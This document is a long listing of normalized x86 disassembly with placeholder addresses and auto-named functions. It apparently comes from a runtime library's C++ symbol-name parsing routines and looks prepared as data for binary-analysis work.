je r-xdata
push r--data
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x1200
sete dl
neg ecx
sbb ecx ecx
test edx ecx
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_422a35
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_421f2b
shr eax 0x4
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x34 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
cmp edx edi
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_4234cb
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x44 ] ecx
call sub_4234cb
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x3c ] ecx
call sub_4234cb
add esp 0xc
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
test esi eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x20 ]
jmp r-xdata
xor edx edx
mov esi 0x800
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
and [ ebp - 0x30 ] esi
xor edi edi
mov [ ebp - 0x34 ] edi
cmp [ ebp - 0x18 ] edi
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call sub_422a35
pop ecx
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
call sub_422261
pop ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_421f2b
call sub_422261
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ rwxdata ]
shr eax 0x9
not eax
test al 0x1
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x20
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x34 ]
push 0x20
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
xor edi edi
push edi
push 0x8
mov ecx rwxdata
call sub_421d93
cmp eax edi
je r-xdata
lea eax [ ebp - 0x54 ]
push edi
push eax
call sub_4225d5
push eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_422db4
add esp 0x14
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
test [ rwxdata ] 0x1000
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] eax
test [ rwxdata ] 0x1000
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_4234cb
pop ecx
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax [ rwxdata ]
shr eax 0x7
not eax
test al 0x1
je r-xdata
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
lea eax [ ebp - 0x54 ]
push edi
push eax
call sub_4225d5
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] eax
mov [ eax ] edi
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov edi eax
mov esi [ ebp - 0x8 ]
mov eax ebx
test esi esi
je r-xdata
push eax
lea eax [ ebp - 0x54 ]
push 0x20
push eax
call sub_422d6c
add esp 0xc
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
test ebx 0x10000
je r-xdata
test [ rwxdata ] 0x1000
jne r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] edx
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
push 0x29
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_423046
push eax
lea eax [ ebp - 0x5c ]
push 0x28
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
test esi esi
je r-xdata
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax ] edx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x20 ] ecx
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax 0x700
cmp eax 0x100
je r-xdata
xor eax eax
inc eax
mov eax ebx
and eax 0x700
sub eax 0x200
neg eax
sbb eax eax
inc eax
jmp r-xdata
mov eax [ rwxdata ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x6c ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_422bb2
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax esi
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x40
sete dl
mov eax edx
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x20 ] ecx
test edx edx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x20 ] ecx
cmp eax edx
je r-xdata
call sub_423122
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_421f2b
call sub_423122
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
test esi esi
je r-xdata
push 0x2c
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x2c
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push 0x2c
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x6c ]
push r--data
push eax
call sub_422db4
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax edi
sub eax esi
jmp r-xdata
test edi edi
je r-xdata
mov eax [ rwxdata ]
shr eax 0x2
not eax
test al 0x1
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax 0x1000
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x80
sete dl
mov eax edx
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_422db4
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x20 ] ecx
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x30 ]
mov [ edi ] eax
mov eax [ ebp - 0x20 ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
jmp r-xdata
push 0x2c
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x64 ]
push r--data
push eax
call sub_422db4
add esp 0xc
push r--data
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_422dfc
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
cmp [ ebp - 0x4 ] 0x0
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov edi 0x1800
mov eax ebx
and eax edi
neg eax
sbb eax eax
inc eax
push 0x0
test bl 0xc0
pop eax
sete al
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
push r--data
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x600
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x400
jne r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
sub_425402
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi 0x2000
push edi
test [ rwxdata ] esi
je r-xdata
mov eax [ rwxdata ]
mov cl [ eax ]
cmp cl 0x3f
jne r-xdata
and [ rwxdata ] 0xffffdfff
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_426949
or [ rwxdata ] esi
pop ecx
pop ecx
test cl cl
jne r-xdata
inc eax
mov [ rwxdata ] eax
cmp [ eax ] cl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x2
jmp r-xdata
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_424785
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
xor eax eax
inc eax
pop ecx
test esi esi
je r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
and [ ebp - 0x4 ] 0x0
test ebx 0x200
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_425402
mov eax [ rwxdata ]
pop ecx
jmp r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp al 0x40
je r-xdata
mov edi ebx
shr edi 0xf
and edi eax
cmp bl al
jle r-xdata
inc eax
mov [ rwxdata ] eax
jmp r-xdata
mov edx 0x8000
test edi edi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_42561a
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
or ebx edx
mov [ ebp - 0x8 ] ebx
or ebx 0x200
mov [ ebp - 0x8 ] ebx
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx 0x1000
test ecx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
mov [ rwxdata ] 0x0
call sub_422b18
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ rwxdata ]
cmp [ eax ] 0x40
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_42561a
pop ecx
mov ecx [ eax ]
mov [ ebp - 0x14 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
jmp r-xdata
test [ rwxdata ] ecx
je r-xdata
cmp al 0x40
je r-xdata
push r--data
push eax
lea ecx [ ebp - 0x14 ]
call sub_422dfc
mov ecx eax
call sub_422b18
mov ebx [ eax + 0x4 ]
mov esi [ eax ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_424867
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ rwxdata ]
mov eax [ ebp + 0x8 ]
test edx ebx
jne r-xdata
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0xffff0000
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_424867
pop ecx
pop ecx
jmp r-xdata
sub_42561a
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
mov [ ebp + 0xb ] bl
mov edi r--data
jmp r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp al 0x40
je r-xdata
cmp [ rwxdata ] bl
je r-xdata
push esi
lea eax [ ebp - 0x18 ]
push eax
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_422338
mov ecx eax
call sub_422dfc
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
push 0x1
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push 0x2
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ rwxdata ] bl
je r-xdata
mov ecx esi
call sub_422461
jmp r-xdata
mov ecx [ rwxdata ]
cmp [ ecx ] 0x3f
jne r-xdata
push esi
lea eax [ ebp - 0x90 ]
push edi
push eax
call sub_422db4
add esp 0xc
push eax
mov ecx esi
call sub_421f4a
cmp [ ebp + 0xb ] bl
je r-xdata
lea eax [ ebp - 0x20 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
sub eax 0x24
je r-xdata
push esi
lea eax [ ebp - 0x78 ]
push 0x5b
push eax
call sub_422d6c
add esp 0xc
push eax
mov ecx esi
call sub_421f4a
mov [ ebp + 0xb ] bl
lea eax [ ebp - 0x68 ]
push esi
dec ecx
push eax
mov [ rwxdata ] ecx
lea eax [ ebp - 0x10 ]
jmp r-xdata
dec eax
je r-xdata
push ebx
push 0x1
push eax
call sub_4243a4
add esp 0xc
push 0x40
push rwxdata
lea ecx [ ebp - 0x8 ]
call sub_42273d
push esi
lea eax [ ebp - 0x58 ]
push r--data
push eax
call sub_422db4
add esp 0xc
push eax
mov ecx esi
call sub_421f4a
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
sub eax 0x1a
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_422498
jmp r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0x5f
jne r-xdata
dec eax
dec eax
je r-xdata
push esi
lea eax [ ebp - 0x60 ]
push eax
push 0x27
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_425402
push eax
lea eax [ ebp - 0x48 ]
push 0x60
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422dd8
jmp r-xdata
cmp [ ecx + 0x2 ] 0x3f
jne r-xdata
sub eax 0x8
push esi
je r-xdata
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
mov [ rwxdata ] eax
push esi
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea eax [ ebp - 0x28 ]
push ebx
push eax
call sub_423cc0
add esp 0xc
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
push 0x5d
lea eax [ ebp - 0x40 ]
push eax
push ebx
lea eax [ ebp - 0x70 ]
inc ecx
push 0x1
push eax
mov [ rwxdata ] ecx
call sub_4243a4
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
mov [ ebp + 0xb ] 0x1
jmp r-xdata
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_423498
pop ecx
jmp r-xdata
inc [ rwxdata ]
jmp r-xdata
sub_42588a
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov cl [ eax ]
sub esp 0x30
test cl cl
jne r-xdata
cmp cl 0x36
jl r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
add esp 0xc
cmp cl 0x5f
je r-xdata
cmp cl 0x39
jle r-xdata
push ebx
movsx ebx cl
sub ebx 0x36
inc eax
mov [ rwxdata ] eax
cmp ebx 0x29
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
jmp r-xdata
test ebx ebx
jl r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
or ebx 0xffffffff
cmp ebx 0x3
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
add esp 0xc
jmp r-xdata
movsx ebx cl
sub ebx 0x3d
inc eax
cmp ebx 0x4
mov [ rwxdata ] eax
jl r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0xffff0000
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
mov edi ebx
and edi 0x2
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp ebx 0x7
jmp r-xdata
test bl 0x4
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
add esp 0xc
cmp [ eax ] 0x0
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push eax
je r-xdata
pop ebx
leave
retn
jle r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
lea eax [ ebp - 0x30 ]
push 0x1
push eax
call sub_422d90
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_42561a
push eax
lea eax [ ebp - 0x30 ]
push 0x20
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422b18
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_422a35
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_421f2b
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_422a35
pop ecx
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_4247cf
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_421f2b
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_4247cf
push eax
lea eax [ ebp - 0x20 ]
push 0x20
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422b18
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
add esp 0xc
jmp r-xdata
cmp al 0x40
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
mov al [ eax ]
mov [ ebp - 0x8 ] ecx
test al al
je r-xdata
push ebx
push 0x8
mov ecx rwxdata
call sub_421d93
cmp eax ebx
je r-xdata
push 0x29
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push 0x28
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
jmp r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x30 ]
push eax
je r-xdata
xor esi esi
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
call sub_422261
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_421f2b
jmp r-xdata
call sub_422261
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
mov eax [ rwxdata ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x30 ]
push eax
je r-xdata
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_4225d5
pop ecx
pop ecx
push 0x29
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_423046
push eax
lea eax [ ebp - 0x20 ]
push 0x28
push eax
call sub_422d6c
add esp 0x10
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
mov eax [ rwxdata ]
and eax 0x60
cmp al 0x60
je r-xdata
call sub_423122
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_421f2b
call sub_423122
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
push 0x3
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
cmp esi ebx
je r-xdata
pop edi
pop esi
sub_425bde
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rwxdata ]
mov al [ eax ]
push ebx
push esi
mov esi 0xffff0000
and [ ebp - 0x20 ] esi
push edi
xor edi edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x1 ] 0x0
test al al
je r-xdata
cmp [ ebp + 0x18 ] edi
jne r-xdata
cmp al 0x24
jne r-xdata
push 0x1
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
mov ecx [ rwxdata ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
and [ ebp - 0x10 ] esi
movsx ebx al
push 0x20
mov [ ebp - 0x14 ] edi
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
and [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] edi
pop edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_4231a1
mov ecx [ ebp - 0x1c ]
add esp 0x10
cmp ecx edi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] edi
jne r-xdata
test [ eax + 0x4 ] 0x100
jne r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_422d90
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] edi
je r-xdata
inc [ rwxdata ]
mov eax [ rwxdata ]
cmp [ eax ] 0x24
jne r-xdata
shr eax 0x11
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
sub eax 0x3
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x54 ]
push 0x20
push eax
push ecx
lea eax [ ebp - 0x4c ]
push 0x1
push eax
call sub_422d90
add esp 0xc
mov ecx eax
call sub_422dd8
mov ecx eax
call sub_422b18
jmp r-xdata
mov ecx [ rwxdata ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
movsx ebx al
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_4231a1
mov ecx [ ebp - 0xc ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x7
call sub_421d75
add esp 0x4
cmp [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x14 ]
push eax
je r-xdata
push 0x9
call sub_421d75
add esp 0x4
cmp [ ebp - 0x1c ] 0x0
lea ecx [ ebp - 0x1c ]
push eax
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
jmp r-xdata
call sub_422a00
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push edi
lea eax [ ebp - 0x44 ]
push eax
call sub_422dd8
mov ecx eax
call sub_422dfc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp ebx 0x1f
ja r-xdata
inc ecx
mov [ rwxdata ] ecx
push 0x8
call sub_421d75
add esp 0x4
